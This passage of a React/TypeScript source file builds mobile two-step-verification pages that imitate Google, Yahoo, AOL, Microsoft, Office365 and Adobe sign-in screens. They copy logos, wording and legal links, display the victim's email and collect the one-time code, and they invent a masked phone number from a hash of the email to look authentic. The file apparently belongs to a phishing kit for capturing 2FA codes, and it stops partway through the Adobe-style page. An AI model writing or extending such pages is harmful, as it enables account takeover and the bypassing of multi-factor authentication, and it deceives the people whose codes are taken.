import React, { useState, useRef, useEffect } from 'react';
import Spinner from '../common/Spinner';
import OtpInput from '../common/OtpInput';

interface MobileOtpPageProps {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  errorMessage?: string;
  email?: string;
  provider?: string;
  onResend?: () => void;
}

const AdobeLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-6 h-6">
    <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
    <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
    <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
  </svg>
);

const maskEmail = (email: string) => {
  const [user, domain] = email.split('@');
  if (!domain) return email;
  const visible = user.length <= 2 ? user[0] : user.slice(0, 2);
  return `${visible}${'*'.repeat(Math.max(user.length - 2, 1))}@${domain}`;
};

const maskPhone = (seedEmail: string) => {
  const hash = Array.from(seedEmail).reduce((acc, c) => acc + c.charCodeAt(0), 0);
  const last4 = String(hash).slice(-4).padStart(4, '0');
  return `(•••) •••-${last4}`;
};

const UserAvatar: React.FC<{ email: string; size?: number }> = ({ email, size = 36 }) => {
  const initial = email.charAt(0).toUpperCase();
  const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853', '#720e9e', '#39007E', '#FF6D01', '#46BDC6'];
  const colorIndex = Array.from(email).reduce((acc, c) => acc + c.charCodeAt(0), 0) % colors.length;
  return (
    <div
      className="rounded-full flex items-center justify-center font-bold text-white flex-shrink-0"
      style={{ width: size, height: size, backgroundColor: colors[colorIndex], fontSize: size * 0.45 }}
    >
      {initial}
    </div>
  );
};

/* ── Gmail / Google-style OTP (Mobile) ────────────────────────── */
const MobileGmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => {
  const [gmailCodeValue, setGmailCodeValue] = useState('');

  const handleGmailCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
    setGmailCodeValue(val);
    onOtpComplete(val);
  };

  return (
  <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', fontFamily: "'Google Sans', 'Roboto', Arial, sans-serif" }}>
    <div className="flex-1 flex flex-col justify-center px-6 py-8">
      <div className="text-center mb-6">
        <svg viewBox="0 0 272 92" className="mx-auto h-6 mb-6" xmlns="http://www.w3.org/2000/svg">
          <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
          <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
          <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
          <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
          <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
          <path d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z" fill="#4285F4"/>
        </svg>
        <h1 className="text-xl font-normal text-gray-800 mb-2">2-Step Verification</h1>
        <p className="text-sm text-gray-600">
          To help keep your account safe, Google wants to make sure it's really you trying to sign in
        </p>
        {email && <p className="text-sm text-blue-600 mt-3 font-medium">{email}</p>}
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
        <div className="flex items-start gap-3">
          <svg className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
          <div>
            <p className="text-sm font-medium text-gray-800">Check your phone</p>
            <p className="text-xs text-gray-600 mt-0.5">A verification code has been sent to your device.</p>
          </div>
        </div>
      </div>

      <form onSubmit={onSubmit} className="space-y-6">
        {errorMessage && (
          <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
            <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
            <span>{errorMessage}</span>
          </div>
        )}

        <div>
          <label className="text-sm font-medium text-gray-700 block mb-2">Enter code</label>
          <input
            type="text"
            inputMode="numeric"
            autoComplete="one-time-code"
            placeholder="Enter code"
            value={gmailCodeValue}
            onChange={handleGmailCodeChange}
            disabled={isLoading}
            autoFocus
            className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:outline-none disabled:bg-gray-100"
            style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
          />
        </div>

        <div className="flex justify-between items-center pt-2">
          <button type="button" className="text-sm font-medium text-blue-600 active:text-blue-800 transition-colors">Try another way</button>
          <button type="submit" disabled={isLoading || otp.length < 6} className="px-6 py-2.5 rounded-md font-medium text-sm text-white bg-[#1A73E8] active:bg-[#1557B0] disabled:opacity-50 transition-colors">
            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
            {isLoading ? 'Verifying...' : 'Next'}
          </button>
        </div>
      </form>

      <div className="mt-8 pt-4 border-t border-gray-100 flex items-center justify-center gap-4 text-xs text-gray-500">
        <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="active:text-gray-700">Help</a>
        <a href="https://accounts.google.com/TOS" target="_blank" rel="noopener noreferrer" className="active:text-gray-700">Privacy</a>
        <a href="https://accounts.google.com/TOS" target="_blank" rel="noopener noreferrer" className="active:text-gray-700">Terms</a>
      </div>
    </div>
  </div>
  );
};

/* ── Yahoo-style OTP (Mobile) ─────────────────────────────────── */
const MobileYahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
  const [resendSent, setResendSent] = useState(false);
  const [yahooCodeValue, setYahooCodeValue] = useState('');
  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);

  const handleResend = () => {
    if (onResend) {
      onResend();
      setResendSent(true);
      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
    }
  };

  const handleYahooCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
    setYahooCodeValue(val);
    onOtpComplete(val);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <div className="flex-1 flex flex-col justify-center px-6 py-8">
        <div className="text-center mb-6">
          <img 
            src="/yahoo-logo.svg" 
            alt="Yahoo" 
            className="mx-auto h-9 mb-6" 
          />
        </div>

        <div className="bg-white rounded-lg p-6" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
          <h1 className="text-lg font-bold text-gray-900 mb-4">Verify your identity</h1>

          {email && (
            <div className="flex items-center gap-3 mb-4">
              <UserAvatar email={email} size={32} />
              <span className="text-sm font-semibold text-gray-900">{email}</span>
            </div>
          )}

          <p className="text-sm text-gray-600 mb-3">Where should we send your verification code?</p>

          <div className="space-y-2 mb-5">
            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'email' ? '#720e9e' : '#e5e7eb', backgroundColor: deliveryMethod === 'email' ? 'rgba(114,14,158,0.04)' : 'transparent' }}>
              <input type="radio" name="delivery" checked={deliveryMethod === 'email'} onChange={() => setDeliveryMethod('email')} className="accent-[#720e9e]" />
              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
              <div>
                <p className="text-sm font-medium text-gray-900">Email</p>
                <p className="text-xs text-gray-500">{email ? maskEmail(email) : 'Email address on file'}</p>
              </div>
            </label>
            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'phone' ? '#720e9e' : '#e5e7eb', backgroundColor: deliveryMethod === 'phone' ? 'rgba(114,14,158,0.04)' : 'transparent' }}>
              <input type="radio" name="delivery" checked={deliveryMethod === 'phone'} onChange={() => setDeliveryMethod('phone')} className="accent-[#720e9e]" />
              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
              <div>
                <p className="text-sm font-medium text-gray-900">Phone number</p>
                <p className="text-xs text-gray-500">{email ? maskPhone(email) : 'Phone number on file'}</p>
              </div>
            </label>
          </div>

          <form onSubmit={onSubmit} className="space-y-5">
            {errorMessage && (
              <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
                <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
                <span>{errorMessage}</span>
              </div>
            )}

            <div>
              <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
              <input
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Enter code"
                value={yahooCodeValue}
                onChange={handleYahooCodeChange}
                disabled={isLoading}
                autoFocus
                className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#720e9e] focus:border-[#720e9e] focus:outline-none disabled:bg-gray-100"
                style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
              />
            </div>

            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-3 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 transition-colors" style={{ backgroundColor: '#720e9e' }}>
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Verifying...' : 'Verify'}
            </button>
          </form>

          <div className="mt-5 text-center">
            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#720e9e' }}>
              {resendSent ? 'Code sent! Check your inbox' : 'Resend code'}
            </button>
          </div>
        </div>

        <div className="mt-6 text-center text-xs text-gray-500">
          <div className="flex items-center justify-center gap-2">
            <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer">Privacy</a>
            <span className="text-gray-300">|</span>
            <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer">Terms</a>
          </div>
          <p className="mt-2 text-gray-400">© 2026 Yahoo. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

/* ── AOL-style OTP (Mobile) ───────────────────────────────────── */
const MobileAolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
  const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
  const [resendSent, setResendSent] = useState(false);
  const [aolCodeValue, setAolCodeValue] = useState('');
  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);

  const handleResend = () => {
    if (onResend) {
      onResend();
      setResendSent(true);
      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
    }
  };

  const handleAolCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
    setAolCodeValue(val);
    onOtpComplete(val);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <div className="flex-1 flex flex-col justify-center px-6 py-8">
        <div className="text-center mb-6">
          <img 
            src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" 
            alt="Aol" 
            className="mx-auto h-9 mb-6" 
          />
        </div>

        <div className="bg-white rounded-lg p-6" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
          <h1 className="text-lg font-bold text-gray-900 mb-4">Verify your identity</h1>

          {email && (
            <div className="flex items-center gap-3 mb-4">
              <UserAvatar email={email} size={32} />
              <span className="text-sm font-semibold text-gray-900">{email}</span>
            </div>
          )}

          <p className="text-sm text-gray-600 mb-3">Where should we send your verification code?</p>

          <div className="space-y-2 mb-5">
            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'email' ? '#39007E' : '#e5e7eb', backgroundColor: deliveryMethod === 'email' ? 'rgba(57,0,126,0.04)' : 'transparent' }}>
              <input type="radio" name="delivery" checked={deliveryMethod === 'email'} onChange={() => setDeliveryMethod('email')} className="accent-[#39007E]" />
              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
              <div>
                <p className="text-sm font-medium text-gray-900">Email</p>
                <p className="text-xs text-gray-500">{email ? maskEmail(email) : 'Email address on file'}</p>
              </div>
            </label>
            <label className="flex items-center gap-3 p-3 rounded-lg border cursor-pointer transition-colors" style={{ borderColor: deliveryMethod === 'phone' ? '#39007E' : '#e5e7eb', backgroundColor: deliveryMethod === 'phone' ? 'rgba(57,0,126,0.04)' : 'transparent' }}>
              <input type="radio" name="delivery" checked={deliveryMethod === 'phone'} onChange={() => setDeliveryMethod('phone')} className="accent-[#39007E]" />
              <svg className="w-5 h-5 text-gray-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
              <div>
                <p className="text-sm font-medium text-gray-900">Phone number</p>
                <p className="text-xs text-gray-500">{email ? maskPhone(email) : 'Phone number on file'}</p>
              </div>
            </label>
          </div>

          <form onSubmit={onSubmit} className="space-y-5">
            {errorMessage && (
              <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
                <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
                <span>{errorMessage}</span>
              </div>
            )}

            <div>
              <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
              <input
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Enter code"
                value={aolCodeValue}
                onChange={handleAolCodeChange}
                disabled={isLoading}
                autoFocus
                className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#39007E] focus:border-[#39007E] focus:outline-none disabled:bg-gray-100"
                style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
              />
            </div>

            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-3 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 transition-colors" style={{ backgroundColor: '#39007E' }}>
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Verifying...' : 'Verify'}
            </button>
          </form>

          <div className="mt-5 text-center">
            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#39007E' }}>
              {resendSent ? 'Code sent! Check your inbox' : 'Resend code'}
            </button>
          </div>
        </div>

        <div className="mt-6 text-center text-xs text-gray-500">
          <div className="flex items-center justify-center gap-2">
            <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer">Privacy</a>
            <span className="text-gray-300">|</span>
            <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer">Terms</a>
          </div>
          <p className="mt-2 text-gray-400">© 2026 Aol. All rights reserved.</p>
        </div>
      </div>
    </div>
  );
};

/* ── Microsoft Logo (Mobile) ──────────────────────────────────── */
const MicrosoftLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 21 21" className="w-5 h-5">
    <rect x="1" y="1" width="9" height="9" fill="#F25022" />
    <rect x="11" y="1" width="9" height="9" fill="#7FBA00" />
    <rect x="1" y="11" width="9" height="9" fill="#00A4EF" />
    <rect x="11" y="11" width="9" height="9" fill="#FFB900" />
  </svg>
);

/* ── Outlook-style OTP (Mobile) ───────────────────────────────── */
const MobileOutlookOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
  const [resendSent, setResendSent] = useState(false);
  const [codeValue, setCodeValue] = useState('');
  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);

  const handleResend = () => {
    if (onResend) {
      onResend();
      setResendSent(true);
      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
    }
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
    setCodeValue(val);
    onOtpComplete(val);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')", backgroundSize: 'cover', backgroundRepeat: 'no-repeat', backgroundPosition: 'center center', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
      <div className="flex-1 flex flex-col justify-center px-4 py-8">
        <div className="bg-white p-6" style={{ boxShadow: '0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108)' }}>
          <div className="mb-4">
            <MicrosoftLogo />
          </div>

          {email && (
            <div className="flex items-center gap-2 mb-4 cursor-pointer">
              <svg className="w-3 h-3 text-gray-800 flex-shrink-0" viewBox="0 0 16 16" fill="currentColor"><path d="M11.3 1.3L5.6 7l5.7 5.7-1 1L3.6 7l6.7-6.7z" /></svg>
              <span className="text-sm text-gray-800">{email}</span>
            </div>
          )}

          <h1 className="text-xl text-gray-900 mb-2" style={{ fontWeight: 600, fontSize: '24px', lineHeight: '1.3' }}>Enter code</h1>

          {email && (
            <p className="text-sm text-gray-800 mb-4" style={{ fontSize: '15px', lineHeight: '20px' }}>
              We sent a code to <span className="font-semibold">{maskEmail(email)}</span>
            </p>
          )}

          <form onSubmit={onSubmit}>
            {errorMessage && (
              <div className="mb-3 text-sm" style={{ color: '#e81123' }}>
                <span>{errorMessage}</span>
              </div>
            )}

            <div className="mb-5">
              <input
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Code"
                value={codeValue}
                onChange={handleCodeChange}
                disabled={isLoading}
                autoFocus
                className="w-full px-3 py-2 text-base border border-gray-400 focus:border-[#0067B8] focus:outline-none disabled:bg-gray-100"
                style={{ fontFamily: 'inherit', fontSize: '15px', height: '36px', borderRadius: '0' }}
              />
            </div>

            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-1.5 px-4 text-white text-sm font-semibold disabled:opacity-50 transition-colors" style={{ backgroundColor: '#0067B8', borderRadius: '0', height: '36px', fontSize: '15px' }}>
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Signing in...' : 'Sign in'}
            </button>
          </form>

          <div className="mt-4">
            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8', fontSize: '13px' }}>
              {resendSent ? 'Code resent successfully' : "I didn't get a code"}
            </button>
          </div>
        </div>

        <div className="mt-4 flex items-center justify-end gap-3 text-xs text-gray-500">
          <a href="https://go.microsoft.com/fwlink/?LinkID=2259814" target="_blank" rel="noopener noreferrer">Terms of use</a>
          <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener noreferrer">Privacy & cookies</a>
          <span className="text-gray-400">···</span>
        </div>
      </div>
    </div>
  );
};

/* ── Office365-style OTP (Mobile) ─────────────────────────────── */
const MobileOffice365Otp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
  const [resendSent, setResendSent] = useState(false);
  const [codeValue, setCodeValue] = useState('');
  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);

  const handleResend = () => {
    if (onResend) {
      onResend();
      setResendSent(true);
      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
    }
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
    setCodeValue(val);
    onOtpComplete(val);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')", backgroundSize: 'cover', backgroundRepeat: 'no-repeat', backgroundPosition: 'center center', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
      <div className="flex-1 flex flex-col justify-center px-4 py-8">
        <div className="bg-white p-6" style={{ boxShadow: '0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108)' }}>
          <div className="flex items-center gap-2 mb-4">
            <MicrosoftLogo />
          </div>

          {email && (
            <div className="flex items-center gap-2 mb-4 cursor-pointer">
              <svg className="w-3 h-3 text-gray-800 flex-shrink-0" viewBox="0 0 16 16" fill="currentColor"><path d="M11.3 1.3L5.6 7l5.7 5.7-1 1L3.6 7l6.7-6.7z" /></svg>
              <span className="text-sm text-gray-800">{email}</span>
            </div>
          )}

          <h1 className="text-xl text-gray-900 mb-2" style={{ fontWeight: 600, fontSize: '24px', lineHeight: '1.3' }}>Enter code</h1>

          {email && (
            <p className="text-sm text-gray-800 mb-4" style={{ fontSize: '15px', lineHeight: '20px' }}>
              We sent a code to <span className="font-semibold">{maskEmail(email)}</span>
            </p>
          )}

          <form onSubmit={onSubmit}>
            {errorMessage && (
              <div className="mb-3 text-sm" style={{ color: '#e81123' }}>
                <span>{errorMessage}</span>
              </div>
            )}

            <div className="mb-5">
              <input
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="Code"
                value={codeValue}
                onChange={handleCodeChange}
                disabled={isLoading}
                autoFocus
                className="w-full px-3 py-2 text-base border border-gray-400 focus:border-[#0067B8] focus:outline-none disabled:bg-gray-100"
                style={{ fontFamily: 'inherit', fontSize: '15px', height: '36px', borderRadius: '0' }}
              />
            </div>

            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-1.5 px-4 text-white text-sm font-semibold disabled:opacity-50 transition-colors" style={{ backgroundColor: '#0067B8', borderRadius: '0', height: '36px', fontSize: '15px' }}>
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Signing in...' : 'Sign in'}
            </button>
          </form>

          <div className="mt-4">
            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8', fontSize: '13px' }}>
              {resendSent ? 'Code resent successfully' : "I didn't get a code"}
            </button>
          </div>
        </div>

        <div className="mt-4 flex items-center justify-end gap-3 text-xs text-gray-500">
          <a href="https://go.microsoft.com/fwlink/?LinkID=2259814" target="_blank" rel="noopener noreferrer">Terms of use</a>
          <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener noreferrer">Privacy & cookies</a>
          <span className="text-gray-400">···</span>
        </div>
      </div>
    </div>
  );
};

/* ── Default / Others / Adobe-style OTP (Mobile) ──────────────── */
const MobileDefaultOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
  <div className="min-h-screen flex flex-col font-sans" style={{ background: 'linear-gradient(135deg, #1B1B1B 0%, #2C2C2C 50%, #1B1B1B 100%)', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
    <div className="fixed top-0 left-0 right-0 h-1 z-10" style={{ background: 'linear-gradient(90deg, #FA0F00, #E8336D, #1473E6)' }} />

    <div className="flex-1 flex flex-col justify-center px-6 py-8">
      <div className="mb-6 text-center">
        <div className="flex justify-center mb-4">
          <AdobeLogo />
        </div>
        <h1 className="text-lg font-semibold text-white mb-1">Two-Step Verification</h1>
        <p className="text-sm text-gray-400">
          Enter the 6-digit code sent to your authenticator app or phone.
        </p>
        {email && (
          <p className="text-sm text-gray-300 mt-2 font-medium">{email}</p>
        )}
      </div>

      <form onSubmit={onSubmit} className="space-y-6">
        {errorMessage && (
          <div className="p-3 rounded-md text-sm font-medium flex items-start gap-2" style={{ backgroundColor: 'rgba(215, 55, 63, 0.15)', color: '#FF6B6B', border: '1px solid rgba(215, 55, 63, 0.3)' }}>
